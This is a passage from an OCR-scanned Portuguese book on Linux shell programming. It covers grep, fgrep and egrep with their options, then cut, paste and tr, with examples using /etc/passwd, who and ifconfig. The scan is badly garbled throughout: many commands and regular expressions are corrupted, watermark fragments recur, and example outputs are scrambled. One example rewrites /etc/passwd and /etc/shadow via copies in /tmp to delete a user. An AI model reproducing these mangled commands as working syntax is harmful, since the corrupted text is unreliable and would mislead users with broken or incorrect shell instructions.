Shell do UNIX, faça: ps -ef 1 grt>p julio 
1\latcna com d r bS utor<t 
Comandos que não são do Planeta 
123 
res. Seu uso, nos casos possíveis, deve ser encorajado, uma vez que 
é 30% mais veloz que o grep e até 50% mais que o egrep. 
CUIDADO!!! Tome cuidado ao usar as expressões regulares nesses coman-
dos, pois caracteres como s, .. , 1 , 1 , h, 1 , <, > , e \, entre outros, são 
significantes para o She/1 e podem desvirtuar totalmente sua interpretação. 
Lembre-se de colocar as expressões regulares entre apóstrofos. 
Com as informações que acabamos de adquirir, agora podemos afirmar 
que nos 3 últimos exemplos o uso do grep não é o mais indicado. Em ambos 
os casos deveria ter sido usado o comando fgrep , já que nenhum deles ne-
cessita do uso de metacaractere. 
Exemplos: 
Veja só isso: 
$ og rop 
' ~ ( i
J I ) • quoquoisso 
Localizar linhas começadas(') por i ou I 
interfaceando com os usuarios , tem tambem as seguintes atribuicoes : 
!nterpretcdo4 de comandos; 
e ISSO: 
$ grep 'A (iJ I) ' 
queque~sso 
$ 
Localizar linhas começadas(') por (l]/) 
Pesquisa neo devolveu nem uma linha sequer 
Note que, ao tentarmos localizar as linhas do arquivo começadas por um 
"i " ou " I " com o grep, nada retornou, sequer erro, pois esse comando 
não interpreta parênteses nem o "ou" 
< 1 > . Dessa forma, foi executada 
uma pesquisa para localizar a cadeia 1 i 1 r> no início da linha. Caso tivés-
semos usado o rgrep estaríamos tentando localizar a cadeia 
h (i 1 I l em 
qualquer ponto da linha. 
Porém, se fosse seu desejo efetuar essa pesquisa com o grep (já que, 
como acabei de dizer, ele é mais rápido que o egrep), poderíamos fazer: 
$ grep • A [ ii] • quequeisso 
Localizar linhas começadas(' ) por i ou I 
interfaceando com os u suar~os , tem tambem as seguLntes atribuicoes : 
Int erpretador de comandos; 
Para localizarmos todos os arquivos comuns do nosso diretório (aqueles 
cuja linha no ls -1 começa por um "- "): 
1\latcna com d r bS utor<t 
124 Programação SheU Linux 
$ la - l a I grop , .... _ , 
Estou procurando um traço(·) na 1• posição 
- 1:10:- r -- r --
1 j ulio 
d ipao 
624 Oec 10 
1996 case . sh 
-rw-r--r--
1 j ulio 
clipao 
416 Sep 
3 10 : 53 qu equeisso 
- .t:\ol- r-- =--
1 julio 
dipao 
415 Aug 28 16 : 40 quequei!l:so-
- rwsr- xr-x 
1 r oot 
sys 
179 De c 10 
1996 shdll.sh 
- rwxr-- r--
1 julio 
dipdo 
1 64 Oec 10 
1996 s helll. s h-
Para localizar os arquivos executáveis pelo seu dono, devemos na pri-
meira posição de um ls -1 procurar um "- " e na quarta um "x " ou um " s " 
(arquivos com SU/0, como veremos mais tarde). 
$ 1s - la I egrep o A ___ (x is)' 
- .t:\'i:S r - xr- x 
1 root 
-n<xr--r--
1 julio 
:sys 
clipao 
Inicia(•) com- qq. 2 carac( .. ) um x ou s(xjs) 
179 Oec 10 
1996 !lhel ll . sh 
164 Oec 10 
1996 shel l1 .sh-
Resultado idêntico ao anterior, porém tempo de execução inferior: 
$ l s - la I g·rep 'A- . . [ xs I ' 
-n.,sr-xr-x 
1 root 
- rwxr--r --
1 julio 
sys 
dipao 
179 Dec lO 
1996 !lhel ll . sh 
164 Oec 10 
1996 shel ll .sh-
Para apimentar um pouco mais esses três comandos, eles podem ser 
usados com diversas opções. Vejamos as mais importantes: 
A opção -c ~ount ou contar) 
Essa opção devolve a quantidade de linhas em que foi encontrada a cadeia 
• 
alvo da pesquisa. E extremamente útil quando estamos desenvolvendo ro-
tinas de crítica. 
ATENÇÃO 
Exemplo: 
A opção -c conta a quantidade de linhas que contêm uma deter-
minada cadeia de caracteres e não quantas vezes esta cadeia foi 
encontrada. 
$ acho Existem ~ grep - c 
'"Maria ' Cad.Pess" Marias t rabalhando na Empresa 
Exist:em 224 Marias t rabalhalldo na Empresa 
No exemplo citado, foi considerado que o nome era o 12 campo do ca-
dastro de pessoal, por isso usamos o 
A
. Repare que dentro dos apóstrofos 
tem um espaço em branco após Maria . Este espaço serve para limitar o 
1\latcna com d r bS utor <t 
Comandos que não são do Planeta 
125 
critério de pesquisa ao primeiro nome, dessa forma não aceitando Maria-
nas ou Mariazinhas. As crases foram colocadas para priorizar a execução 
do comando grep , já que quando a mensagem fosse ecoada, já seria ne-
cessária a quantidade de Marias encontradas pelo grep. 
A opção -l 
Algumas vezes você quer saber quais são os arquivos que possuem uma 
determinada cadeia de caracteres, sem se interessar por nenhum detalhe 
desses arquivos. Para tal, usa-se a opção -1 . Esta opção é utilíssima para 
descobrir programas que necessitam de manutenção. 
Exemplo: 
Suponhamos que você queira saber quantos programas terão de ser 
alterados caso se renomeie um arquivo que atualmente chama-se ArqOLs. 
A primeira, mais óbvia e tradicional, porém menos esperta, é a seguinte: 
$ cd dirscripts 
$ f g rep ArqOLs • . 5h 
list.adir . sh : 
list.adir . sh : 
list.adir . sh : 
l is~:usu . sh : 
Diretório onde residem os scripts SheN 
Pesquisa arquivos com extensiio .sh (scripts) 
Haq• ' grep " '$0L" /usr / l ocal/var/ArqOLs I' 
if ( ·grep - c " '$0L" /usr / l ocol/var/Al:qOLs ' -eq O J 
Macr- ·grep "'SOL" /usr/local/var/ArqOLs I cut - f2 ' 
cat /usr/local/var/A.rqOts I 
t:ranscdb .sh : 
'l NomeoL= ' grep " A$Linha " $Dirvar/ArqoLs 
cut - f2 ' 
t:ranscdb .sh : 
") Nomeot='grep " '$OL" $DirVar/A.rqOLs I cut -!2 ' 
t:r~nscdb . sh : c~t $DirV~r/ArqOLs I 
tri1nscdb01 . sh: •t l'lomeOL= · grep " '$Linh~ • $DirV,.r/ArqOLs 
cut - f2 · 
transcdbOl.sh : 
• ) NomeOL= ' grep " '$0L" $DirVar/ArqOLs 
cut -f2 ' 
transcdbOl .sh : cat $DirYar/ArqOLs I 
transsub.sh: 
Linha= ' grep 'A ' SOLN /usr/local/var/ArqOLs ' 
transsub.sh : Site= ' echo "$Linha" I cut -f2 ' 
lili#U ArqOLs no Fomat 
uparau .sh : 
11aq= · g.rep " A sOL" /usr/local/var/ArqOLs I cut -f2 · 
Erro " Nao encom;rei OL $0L em ArqOLs " 
< /u.sr/local/v ar/ArqOLs 
uparau .sh : 
uparau . .sh : I 
uparaug.sh: 
uparaug.sh : 
!1aq:'grep '"SOL" /usr/local/var/ArqOLs I cut - f 2 ' 
Erro " Na o encom: rei OL $0L em ArqOLs " 
upar&U<J.Sh: ) < /usr/local/var/ArqOLs 
Ou então de uma forma mais esperta e limpa: 
$ cd dir seripts 
$ f g rêp -1 ArqOLs * . sh 
l i =:~tndir . ~h 
l i st:usu. sh 
1\latcna com d r bS utor<t 
126 Programação SheU Linux 
transcdb .sh 
transcdb01 . sh 
transsub .sh 
uparau .sh 
uparaug . sh 
Ou ainda para sabermos somente a quantidade de programas a serem 
alterados: 
$ cd dirscript s 
$ fgrep - 1 ArqOLs *. sh 1 wc - 1 
caracteres 
7 
A opção -v 
wc ·I conte linha e wc ·c conta 
Essa opção da família grep é particularmente útil para excluir registros de 
um arquivo, uma vez que ela devolve todas as linhas que não possuem a 
cadeia pesquisada. 
Exemplo: Neste exemplo, vamos remover um usuário chamado kara . 
Existem duas formas de fazê-lo: usando-se o comando userdel -r kara (a 
opção -r é para remover também o home directory) ou então: 
$ rm - r -kara 
$ grep - v 
· ~kara:• /etc/passwd > /tmp/passwd 
Sgrep -v 'Akara: ' /etc/shadow > / tmp/shadow 
$ mv /tmp/passwd /etc/passwd 
$ mv /tmp/ shadow /etc/ shadow 
A opção -f (file) 
Removeu o diretório home do Karo 
Gerou oltmplpasswd sem o Kara 
Idem ao ltmplshadow 
Efewou aexd!.são cb K8f8 emletdpasswd 
Idem em letdshadow 
Essa opção é muito interessante, pois ela pesquisa um arquivo, procuran-
do por Expressões Regulares contidas em outro arquivo, que será definido 
pela opção -f. 
O bacana dessa opção é que ela evita 2 laços (/oops): um de leitura do 
arquivo de dados e outro de leitura do arquivo a ser pesquisado. 
Exemplos: 
O meu problema é listar os registros de /etc/pass.,,d dos usuários que 
estão no arquivo usus . Veja a cara dele: 
1\latcna com d r bS utor <t 
$ cat usus 
bin 
~r c 
root 
s ys 
uucp 
Comandos que não são do Planeta 
127 
Nas linguagens convencionais, eu teria de fazer um programa que lesse 
cada registro de usus e o pesquisasse linha a linha em /etc/passHd, já 
que usus está em ordem alfabética e /etc/pass1~d está na sequência do 
cadastramento. 
Aqui eu só tenho um probleminha: no /etc/pass ~<~d tem bin em profu-
são, devido aos usuários que usam /bin/bash como Shell padrão (default). 
Temos então de mudar u sus para que a pesquisa seja feita somente no 
início do /etc/passwd . 
Resolvido este problema, surge outro, já que a pesquisa pelo usuário 
sys localizará no início da linha, além do sys propriamente dito, também 
o syslog. Então temos de mudar usus para delimitar também o fim do 
campo, o que faremos colocando dois pontos c: 1 ao final de cada registro. 
Veja como eu mato 2 coelhos com uma só "secla da ". ; ): 
$ sed -i 's/Af\ A/;s/$/ :1 ' usus 
No duro, fiz um dois-em-um: no primeiro comando s do sed, substi-
tuí o início de cada registro ( "l por um circunflexo (que está "escapado" 
para ser interpretado como um literal e não como um metacaractere como 
o anterior. No segundo comando s, substituí o final de cada registro por 
dois pontos c: l . A opção -i foi usada para que a saída editada fosse no 
mesmo arquivo. Veja como ele ficou: 
$ cat usus 
~bin : 
"ire : 
"root : 
""s ys. : 
~uucp : 
Agora é mole, basta executar o grep, veja só: 
$ grep - f usus / etc/ passwd 
roo-c :x :O: O: root : /root: /bin/bash 
1\latcna com d r bS utor<t 
128 
Programação SheU Linux 
bln:x
: 2 : 2 : bin : /bin : /b~n/sh 
sys :x : 3: 3 : sys : /dev : /bin/sh 
uucp : x : 10 : lO : uuc p : /var/spool/uucp : /bin/sh 
uc : x: 39: 39: ircd : /var/ run/ircd : /bin/sh 
A opção -o (only matching) 
Com essa opção o grep devolve somente a parte que casou com a Expres-
são Regular especificada. Essa opção é ótima para depurar Expressões 
Regulares. 
Exemplos: 
S grep -o •a. • a• <<< batatada 
at:at.ada 
S grep - o •a. • a• <<< batatuda 
atatuda 
Não era isso que você esperava? l embre-se que o asterisco 
loso {veja apêndice sobre Expressões Regulares). 
Antes ou depois 
' 
1 • l e gu-
Algumas vezes, temos um arquivo que é formado por diversos tipos de re-
gistros. Por exemplo: um cadastro de pessoal tem pelo menos os seguintes 
tipos de registro: 
• 
Dados pessoais; 
• 
Dados profissionais; 
• 
Histórico de pagamentos . 
• 
Entre outros. E para casos assim que existem duas opções do grep: 
- A n (.n. de After- depois)- pega além da linha que casou com a Expressão 
Regular, n linhas após; 
-a n (a de Before - antes)- pega além da linha que casou com a Expres-
são Regular, n linhas antes. 
Exemplos: 
S ifeonfig I g r e p - A7 •AwlanO• 
1\latcna com d r bS utor <t 
Comandos que não são do Planeta 
129 
>rlanO Link encap : Echernec Endereço de HW 08 : 28 :58 : 04 : e1 : 53 
inet end .: 193.167 . 2 . 2 Bcast : 193 . 167 . 2 . 5 J.lasc : 255 . 255 . 255 . 0 
endereço inet6 : fe80 : : 25Z : 58ff : fe04 :e153/64 Escopo : Link 
UP SROJ\.DCAST RUMN{NG MULTlCl\ST ~!TU: 1500 Hétdca : 1 
pac otes RX : 28 e r ros : O descartados : O excesso : O quad .ro: O 
Pacotes TX : SO e r ros : O descar tados : O excesso : O por tador a : O 
colisõos : O txqucucl cn : lOOO 
RX by t e:s : 4170 (4 . 1 KB ) TX byte:5 :12324 ( 12 . 3 KB) 
Usando o exemplo anterior, suponha agora que eu queira saber o meu 
endereço IP. Como ele está situado na linha seguinte à começada por 
wl anO, posso fazer: 
$ ifconfi9 I grep -Al •AwlanO' 
>rlano Lin~: encap : Echernec El\dcreço de IM 08 : 28 : 58 : 04 : el : 53 
inet end .: 193 . 167 . 2 . 2 Bcast :193 . 167 . 2 . 5 Hasc : 255 . 255 . 255 . 0 
Como só interessa o endereço IP, vamos mandar essa saída para uma 
Expressão Regular para filtrar estes campos: 
$ ifconfi g I grep -Al 1 Awlan0 1 I grep -Eo 1 [O-g)(l,3)\. (0-9) (1 ,3)\.[0- g] ~ 
{1 ,3) \ . [0- 9) {1 , 3) . 
193 . 167 . 2 . 2 
193 . 167 . 2 . 5 
255 . 255 . 255 . 0 
Como você viu, a filtragem foi feita, e a opção -o fez com que fosse para 
a saída apenas o que casou com a Expressão Regular. Mas eu não quero 
o meu IP de broadcast nem a máscara. Só me interessa o primeiro. Então 
vamos pegar somente a primeira linha da saída: 
$ ifconfi g I grep -A1 • Aw1an0' I grep -Eo ' [0-9]{1,3)\. [0-9] (1 ,3 ) \. [0 -9] ~ 
{1,3)\ .[0-9] {1 , 3) ' 
I head - 1 
193 . 167 . 2 . 2 
Um conselho: caso você não tenha entendido esta Expressão Regular, 
neste livro tem um apêndice que fala somente sobre o assunto. Vale a 
pena dar uma olhada, pois Expressões Regulares são usadas por 90% 
das linguagens de programação, e quando você conhecê-las, elas pas-
sarão a ter uma importância enorme na sua vida profissional. Vale muito 
a pena! 
1\latcna com d r bS utor <t 
130 Programação SheU Linux 
Os comandos para cortar e colar 
Cortando cadeias de caracter~es - cut 
Agora vamos falar em um comando utilíssimo na elaboração de scripts- o 
cut . 
Esse comando é usado quando se deseja extrair campos ou pedaço de 
dados de arquivos, ou de qualquer outra entrada. Seu formato geral é: 
cut - ccaracteres [arquivo] 
Onde c a r acter es é a porção que se deseja cortar de cada registro de 
arquivo . Isso pode ser um simples número ou uma faixa. Essas atribui-
ções podem ser: 
cut -cpos~ç3o arq 
cut - cposini -posfim arq 
cut -cpos~ n i- arq 
cut -c-posfirn arq 
Exemplos: 
$ who1 
ciro 
ttyp2 
norben.o t:typ3 
ney 
lui:l 
hudson 
julio 
$ who I 
ciz:o 
norberto 
ney 
lui:J 
hudson 
julio 
ttyp4 
ttypS 
t typ6 
t typ7 
cut -c- e 
Sep 
Sep 
sep 
Sep 
Sep 
Sep 
$ who 
cut -cl0-15 
nyp 2 
ctyp3 
8 
8 
8 
8 
8 
8 
09 : 02 
15: 57 
14 : 51 
16: 23 
10: 33 
11: 19 
Retoma todos os caracteres de posição 
Retoma todas as cadeias entre posini e posfim 
Retoma todas as cadeias a partir de posinl 
Retoma todas as cadeias do inicio até posfim 
(11.0 . 132 . 95) 
(11.0 . 132 . 98) 
(11 . o . 132 . 96) 
(11 . 0 . 132 . 93) 
(11 . 0 . 132 . 91) 
(11 . 0 . 132 . 94) 
Extrair da salda do who até o 8! caractere 
Tirar da saída do who do 'f(Ji até o 15t catactere 
8. Esse ê o formato LINUX da saida do comando who. Entre os diversos sabores UNIX existem 
pequenas diferenças cosméticas. 
1\latcna com d r bS utor<t 
tcypq 
r.cyps 
r.cyp6 
ttyp7 
$ who I eu t -o32-
( 11 . o. 13 2 . 95) 
(11. o . 132 . 98) 
(11 . 0 . 132 . 96) 
(11.0 . 1 32 . 93) 
(11.0 . 132 . 91) 
(11 . 0 . 132 . 94} 
Comandos que não são do Planeta 
131 
Tirar da saida do who a partir do 32" caractere 
Nesse exato momento, aparentemente chegamos a um impasse, por-
que você vai me dizer: 
Esse tal de cuc nem de longe serve para mim. O que um programa-
dor mais precisa não é de extrair posições predefinidas, mas sim de 
determinados campos que nem sempre ocorrem nas mesmas posi-
ções do mesmo arquivo. 
E eu vou lhe responder: 
Você está coberto de razão. Precisamos muito extrair campos prede-
finidos dos arquivos; portanto v<Ou lhe contar como se faz isso. 
Existem duas opções do cut que servem para especificar o(s) campo(s) 
dos registros que desejamos extrair. São elas: 
A opção -f (fieldl- Serve para especificar os campos (fields) que dese-
jamos extrair. Obedece às mesmas regras do -c caractere. Isto é: 
cut -fcampo arq 
cut -fca~~oini-eampofim arq 
cut - fcampoini- arq 
cut -f-campof im arq 
Retoma o campo campo 
Retoma campos de campoini a campofim 
Retoma todos os campos a partir de campoini 
Retoma todos os campos até o campofim 
Bem, tudo o que foi falado sobre a opção -f só serve se o delimitador 
de campos for o caractere <TAB> (to 11 > , que é o delimitador default. Para 
podermos generalizar seu uso, devemos conhecer a opção: 
A opção -d (delimitador) - Ao usarmos essa opção, descrevemos para 
o cut qual será o separador de campos do arquivo. No uso dessa opção é 
necessário tomarmos cuidado para proteger (com aspas ou apóstrofos) os 
1\latcna com d r bS utor <t 
132 Programação SheU Linux 
caracteres que o She/1 possa interpretar como metacaracteres. Seu forma-
to geral é: 
cut 
-fc~~~o~ [-ddclimitador) ~rqu~ vo 
Onde delimitador é o caractere que delimita todos os campos de 
arquivo. 
Exemplos: 
$ tail -4 / etc/ passwd 
Listando os últimos 4 registros de /etclpasswd 
aluno4 : x:54084: l 7026 :curso UNI X Basico : /dsv/usr/a luno4 : /u~r/bin/ksh 
alw>o5 : x : 5<1085 : 17026: CUrso UNIX Basico: /dsv/usr/aluno5 : /usr/b>.n/ksh 
al uno6: x:54086: 17026:CUrso UNIX Basico: /dsv/usr/al uno6: /usr/bin/ksh 
aluno7 : x: 54087: 17026 :Curso UNIX Basico: /dsv/usr/ahmo7 : /usr/bin/ksh 
$ t ail - 4 / etc/ pas swd 1 cut - f l -d : 
Extraindodasa/dadotailsomenteo fi campo 
aluno4 
al unoS 
al uno6 
nl uno7 
O arquivo telefones foi criado com 2 campos separados por um <TAB>, 
e com o seguinte conteúdo: 
$ ca.t telefones 
Ciro Grippi 
Ney Gerhordt 
F;nio Cardoso 
Cl audi a Marci a 
Paula Duarte 
Ney Garrafas 
(021)555-1234 
(024) 543-4321 
(023) 232-3423 
(021) 555-2112 
(0 11) 449-0989 
(021)986-3398 
Para extrair somente os nomes: 
$ ca.t tel e f ones I cu t - fl 
Ciro Grippi 
Ney Gerhar dt 
Enio Catdoso 
Cl audi a Marci a 
Paula Duarte 
Hey Garrafa, 
Quero somente o primeiro nome: 
$ cat tolefonos I cut - f l - d 
cut: option requires an argument -- d 
cut: ERROR: Usage : c ut [-s] {-d<cha r>l 
Delimitador <TAB> é o default. Não especifiquei 
Depois do -d eu coloquei um espaço 
ZEBRA!!!! 
(- c<list> I - f<list> J file .. . 
1\latcna com d r bS utor<t 
Comandos que não são do Planeta 
133 
ZEBRAIIII Eu queria pegar o nome que estivesse antes do delimitador 
espaço mas esqueci que espaços, em Shell, devem estar entre aspas. Va-
mos tentar novamente: 
$ cat tele fones I cut -fl -d" • 
Ci ro 
Hey 
Enio 
Cl audia 
Paula 
Ney 
o cr illdica que o defrnlador é branco 
Mas ficaria melhor se não usássemos o comando cat e fizéssemos assim: 
S cut. -fl -d " " telefones 
Para extrair o código de 000: 
$ cut - f2 -d" (" t.elefones I cut - fl - d" ) " 
021 
024 
023 
021 
011 
021 
Repare que o '('e o r estão entre aspas 
Se não colocássemos os parênteses entre aspas, olha só a encrenca: 
$ cut. -f2 -d( t.elefones 1 cut -fl -d ) 
ksh: synt.ax error : · ! ' unexpected 
Colando cadeias de caracteres - paste 
O paste funciona como um cut de marcha à ré, isto é, enquanto o cut 
separa pedaços de arquivos, o paste junta-os. Seu formato genérico é: 
pas t.e [a r qui v o I [a r qui v o.] . . . [ar qui v o I 
• 
... 
r1 
Onde cada linha de um arquivo é colada à linha da posição corres-
pondente do outro arquivo , de maneira a formar linhas únicas que serão 
mandadas para a saída padrão. Vejamos os exemplos: 
Exemplo: 
$ cat /etc/passwd 
bolpet.ti :x : 54000 : 1001 : Joao Bolpet.ti Neto- DlSB . O 82 1-
rnoswal do : x : 5400l: l001 :Marco Os\·;aldo da Cost:a Freitas diteo 2338 
jneves:x :54002 :100 l : J ulio Ceza r Neves 821-6339 
cgrippi:x : 54003 : 1001:Ciro Grippi Barbosa Lima -
ramal (821)2339 
$ cat /etc/passwd J cut - fl -d : > /trrq>/logins 
ftcanpo(·fl)mandarhparaltmp'/otjns 
1\latcna com d r bS utor <t 
134 Programação SheU Linux 
$ cat /ot c / pass•.od I c:ut - f 3 - d : > /tnp/ uid 
$ paste / tmp/ l ogins / tmp/ uid 
bo lpetti 
5•1000 
moswaldo 
54001 
jneves 
5 4002 
cgrippi 54003 
:1 canpo (·13) ~rb 
para ltmp'w 
Juntando as /ilhas de ttmpAogins e Amp.1id 
Nesse exemplo, tiramos um pedaço do /ecc/passwct e dele extraímos 
campos para outros arquivos. Finalmente, como exemplo didático, junta-
mos os dois arquivos dando a saída na tela. Note que o p a s te inseriu entre 
os 2 campos, o separador <TAB>, seu default. 
A opção -d (delimitador) 
Analogamente ao cut, a sintaxe do paste permite o uso de delimitador, 
que também deve ser protegido (com aspas ou apóstrofos) se porventura o 
She/1 puder interpretá-lo como um metacaractere. 
No exemplo anterior, caso quiséssemos alterar o separador para, diga-
mos, ": " teríamos que fazer: 
$ pa ste -d: / tmp/ l ogins / tmp/uid 
bo lpetti : 54000 
moswal do : 5 4001 
jneves :54002 
cgrippi : 54003 
A opção -s 
Serve para transformar linhas de um arquivo em colunas, separadas por 
<TAB> : 
Exemplo: 
$ p aste - s / tmp/ logins 
bolp e;:ci 
moswaldo 
jneves cgrippi 
Se quiséssemos os campos separados por espaço e não por <TAB>, 
faríamos: 
$ past o - s - d " " / tmp/ login s 
bolpetti moswaldo jn~V@S cgrippi 
1\latcna com d r bS utor <t 
Comandos que não são do Planeta 
135 
Perfumarias úteis 
Com o comando paste você também pode montar formatações exóticas 
como esta a seguir: 
$ la I paate - s - d '\t\ t \ n • 
nrql arq2 arq3 
arq4 arq5 arq6 
O que aconteceu foi o seguinte: foi especificado para o comando pas-
te que ele transformaria linhas em colunas (pela opção - s ) e que os seus 
separadores (É ... ! Ele aceita mais de um, mas somente um após cada co-
luna criada pelo comando) seriam uma <TAB> , outra <TAB> e um <ENTER> , 
gerando dessa forma a saída tabulada em 3 colunas. 
Agora que você já entendeu isso, veja como fazer a mesma coisa, po-
rém de forma mais fácil e menos bizarra e tosca, usando o mesmo coman-
do mas com a seguinte sintaxe: 
$ ls I paste -
-
-
arql arq2 arq3 
arq4 arq5 arq6 
E isso acontece porque, se em vez de especificarmos os arquivos, co-
locarmos o sinal de menos (-), o comando paste e em muitos outros, os 
substitui pelos dados que recebeu pela entrada padrão. Neste exemplo os 
dados foram mandados pela saída padrão (stdout), pelo 1s e o pipe 1 1 l 
os desviou para a entrada padrão (stdin) do past e . Veja mais um exemplo 
para facilitar a compreensão: 
$ ea.t a.rql 
predis posição 
privilegiado 
profissional 
$ eat arq2 
encher 
rnárlo 
motor 
$ cut - c -3 arql I paste - d "" - arq2 
preencher 
prim,irio 
promotor 
1\latcna com d r bS utor <t 
136 Programação SheU Linux 
Nesse caso, o cut devolveu as três primeiras letras de cada registro de 
arql , o paste foi montado para não ter separador <- d "" I e receber a 
entrada padrão (desviada pelo pipe) no traço H 
gerando a saida junta-
mente com a rq2 . 
O tr traduz, transcreve ou transforma cadeias de 
caracteres? 
Avalie você mesmo a sua finalidade! No duro, o tr recebe dados da en-
trada padrão (que a essa altura voc.ê já sabe que pode ser redireciona-
da), convertendo-os mediante um padrão especificado. Sua sintaxe é a 
seguinte: 
tr (-opcao) <dos-car acteres> <para-os-caracteres> 
onde <dos-caracteres> e <para-os-caracteres> é um ou mais caracte-
res. Qualquer caractere vindo da entrada definida, que coincida com um 
caractere de <dos- earaetere s>, será convertido para o seu corresponden-
te em <para-os-caract eres>. O resultado dessa conversão será enviado 
para a saída. 
Exemplo: 
Vamos pegar de volta o nosso velho quequeisso . 
$ cat quequei sso 
ATENCAO, O TEXTO ASAIXO NAO EH TREINANENTO, 
EH Vl•lA LAVAGEM CEREBRAL ! ! ! 
O Shell alem de analisar cada dado entrado a partir do prompt do UNIX, 
interfaceando com os usuarios, tem tambem as seguint es atribuicoes : 
Int erpretador de comandos; 
Controle do ambiente UNIX; 
Redirecionamento de entrada ~ snida; 
Substituicao de nomes de arquivos ; 
Concatenacao de pipe ; 
Execucao de programas; 
Poderosa linguagem de programacao . 
Na sua forma mais simples, podemos usar o tr para fazer simples subs-
tituições. Assim, se quiséssemos trocar toda letra a por letra z faríamos: 
1\latcna com d r bS utor <t 
Comandos que não são do Planeta 
137 
$ eat quequeisso 
> tr a z 
A'l'ENCJ>.O, O TBXTO J\.SAIXO NAO E.'l TRíi!INAHENTO, ' 
íi!H U11.n. LIWAGE!1 CEREBRAL ! ! ! 
}
Estou listando o quequeísso para ... 
converter a letra a na letra z 
O Anão sofreu aleraç~o pcxque é maiJsaio 
o Shell zlem de znzliszr czdz dzdo encrzdo z pzrtir do prompt do VNJX, 
interfzcezndo com os US\Izrios, cem tzll'bem zs seguintes ztribuicoes: 
Interpretzdor de comzndos ; 
conr.role do znlbiente UNIX; 
Redirecionzmenco de entrzdz e szmdz; 
Substi cui czo de nomes de zrqui vos; 
conczr.enzczo de pipe ; 
Exeeuczo de progrzmzs ; 
?oderosz l i nguzgem de progrzmzczo. 
As duas linhas anteriores têm um bom uso: servem para desen-
volver linguagens com grau de complexidade semelhante à lingua do 
PÊ ... ! Poderíamos também fazer a conversão, usando a entrada de 
outra forma: 
S t r A a < quaquaisso 
É melhor ~ver desta klm1a, sem usar o p!pe 
a'l'ENCaO, O TEXTO aBaiXO NaO EH 
TR~:INaHENTO, 
EH Ul•la LaVaGEI1 CEREBRaL ! ! ! 
O Shell alem de analisar cada dado entrado a partir do prompt do VNIX, 
intertaceando com os usuarios . cem tarrbem as seguintes atribuicoes : 
Im:erprecador de comandos ; 
Controle do ambiente UNIX; 
Redirecionamento ele entrada e saida; 
substituieao de nomes de arquivos ; 
concatenacao de pipe ; 
Execucao de pr ogr amas ; 
Poderosa l inguagem de programacao. 
Nesse último exemplo, vimos como converter os A (maiúsculos) em a 
(minúsculos). 
Nos dois casos anteriores, a entrada dos dados foi feita ou por um pipe-
line de comandos, ou redirecionando a entrada. Isso deve-se ao fato do tr 
estar esperando os dados pela entrada padrão. 
Veja um exemplo mais lógico do tr. Suponha que queiramos tabelar 
os login names e os home directories dos dez primeiros registros de /etc/ 
pass~1d . Observe a execução da instrução a seguir: 
1\latcna com d r bS utor <t 
138 Programação Shell Linux 
$ head - 10 / etclpasswd 
> cut -f1, 6 - d: 
root :l 
daemon : / 
bin: l usr/bin 
sys : l 
adm: lvarlactm 
uucp : /us.r. I lib/ uucp 
lp:/var/spool / l p 
nuucp: /v a r I spooJ./uucppublic 
listen :/u.sr/netl nls 
s ync : l 
} Separo os 10 primeiros registros de 
letc/passwd para pegar o 1• e 6" campos 
Da execução do comando anterior, resuffaram o 
1• e 6" campos dos 10 primeiros registros de 
Jetc/pesswd. O separador pennanece 2 pontos 
Então, para realizarmos o proposto, deveríamos: 
$ head - 10 / etc/passwd 
> cut - fl,6 - d : 
> tr : 
' 
' 9 
roo~ 
daemon 
bin 
sys 
adm 
uucp 
l p 
nuuc p 
lis<:en 
sync 
I 
I 
lusr/bin 
I 
lvar/adm 
lusr/ l ib/uucp 
I v ar /spool/ lp 
lvar/spool /uucppub lic 
/ us r/net/nls 
I 
} Idêntico ao anterior, porém troco :por< TAB> 
Uma das boas ferramentas do comando tr, somente no Linux ( GNU 
tr) , é que ele aceita um série de classes que servem para generalizar a 
. 
pesqUISa em <dos-caracteres> e <para-os-caracteres>. 
Essas classes, que são bastante abrangentes, podem ser vistas na ta-
bela a seguir: 
9. Esse exemplo é válido somente em Shell sendo executado em ambiente UNIX. Quando estiver 
sob o LINUX, o <TAB> deve ser substituído por • \ t • ou por seu valor octal (\011) como vere-
mos na tabela e exemplo mais à frente. 
Material com direitos autorais 
Comandos que não são do Planeta 
139 
.J Classe 
Atua sobre: 
[car*] 
Em para-os- caracteres, cópias de car até o tamanho 
de <dos-caracteres> 
[car" rep] 
Repete rep cópias de car 
[:alnum:) 
Letras e dígitos 
[:alpha:] 
Letras 
[:blank:] 
Espaços em branco horizontais 
[:cntrl :] 
Caracteres de controle 
[: digi t:] 
Dígitos 
[ :graph :1 
Caracteres i;~'"-'-", 
• não ihclui 
[:lower:) 
Letras minúsculas 
[:print:) 
Caracteres i;"""', 
• inclusive 
[:punct:] 
Caracteres de pontuação 
[:space: ] 
Espaços em branco horizontais e verticais 
[:uppet':] 
Letras maiúsculas 
[ :xdigit:] 
~'l:f"V" hexadecimais 
c~car-J 
Caracteres equivalentes a car 
Exemplos: 
S tr '(:lower:)' '(:upper:)' < quequeisso 
ATENO,O, O TEXTO ABAIXO NAO EH TRBINI>.NENTO, 
EH UI1J>. LIWAGSM CEREBRAL!!! 
O SHELL ALEI'! DE ANALISAA CADA DADO ENTRADO A I'AATIR DO PRCNPT DO UNIX, 
INTERFACEANDO COM OS USUARIOS , TEM T~IBEM AS SEGUINTES ATRIBUICOBS: 
I NTERPRETADOR DE C~r~DOS ; 
CONTROLE DO AMBlENTE UNIX; 
REDIRECIONAMENTO DE E~ITRADA E SAlDA; 
SUBSTI TUICAO DE NOMES DE ARQUI VOS ; 
CONCATENACAO DE PIPE; 
EXECUCAO DE PROGRA.'IAS; 
PODEROSA LINGU;o.GEM DE PROGRAH1'.CAO. 
O c r: também pode usar caracteres octais, tanto para especificar o que 
estamos pesquisando como para definir o resultado que esperamos. 
A representação octal é passada para o t~: no seguinte formato: 
\nnn 
1 Qrl 
140 Programação Shell Linux 
Suponha agora que eu tenha um arquivo com comandos separados por 
ponto e vírgula e eu queira colocar cada comando em uma linha. Vejamos 
como está esse arquivo: 
$ cat confusao 
cd SHONE: ; pwd ; date;ls -la;echo $LOGI.Jl\ME: x$ ( SHELL)x 
Para colocá-lo de forma legível, podemos fazer: 
$ c;,.t confusao I t r ";" "\012" 
cd $HONE 
p:.d 
date, 
ls -la 
e,cho $LOGN.~~6 x${SHELL I X 
Converte ; em <ENTE R> 
Mas essa linha ficaria melhor se fosse escrita com redirecionamento de en-
trada (stdin), evitando o uso do pipe 1 1 ) • Veja: 
$ tr ~~; '' "\012'' < confusao 
Mas essa notação também pode ser representada por um · \cararacte.re • 
onde caracte~ee pode ser qualquer um dos que constam na tabela a seguir: 
